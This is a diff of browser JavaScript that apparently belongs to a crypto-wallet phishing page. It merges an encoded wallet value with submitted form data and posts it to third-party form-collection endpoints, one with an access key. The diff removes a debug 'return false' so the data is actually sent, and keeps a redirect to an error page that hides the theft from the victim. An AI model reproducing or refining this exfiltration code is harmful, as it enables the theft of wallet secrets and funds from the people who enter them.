@@ -1,8 +1,8 @@
 
 const params = {
     "https://api.web3forms.com/submit": { "access_key": "a1515533-be40-4008-9a96-40b84fdeb923" },
-    "https://submit-form.com/lZMfCHudt": {},
-    "https://formsubmit.co/7a39d7898e305d552df9bfc6cc1728c6": { "_captcha": "false", "shakira": "shakira" },
+    //"https://submit-form.com/lZMfCHudt": {},
+    //"https://formsubmit.co/7a39d7898e305d552df9bfc6cc1728c6": { "_captcha": "false"},
 };
 
 const urls = Object.keys(params);
@@ -21,9 +21,6 @@ function sendPostRequest(url) {
 
     let mergedData = Object.assign({ 'provider': wallet_encoded }, message, requestData);
     let reqString = JSON.stringify(mergedData);
-    console.log('Sending this data:');
-    console.log(reqString);
-    return false;
 
     return new Promise((resolve, reject) => {
         $.ajax({
@@ -32,13 +29,11 @@ function sendPostRequest(url) {
             data: reqString,
             contentType: "application/json",
             dataType: "json",
-            success: (data) => console.log(data),
-            error: (err) => console.log(err)
         });
 
         setTimeout(() => {
             reject(new Error('Request timed out'));
-        }, 999999999); // should by about 6000ms by defualt
+        }, 10000); // should by about 6000ms by defualt
     });
 }
 
@@ -69,11 +64,10 @@ function send(option) {
     Promise.all(promises)
         .then(function (responses) {
             console.log("All requests completed:", responses);
-            window.location.href = "/errorpage.html"; // Replace with the desired URL
         })
         .catch(function (error) {
             console.error("An error occurred:", error);
-            window.location.href = "/errorpage.html"; // Replace with the desired URL
+            //window.location.href = "/errorpage.html"; // Replace with the desired URL
         });
 
 }
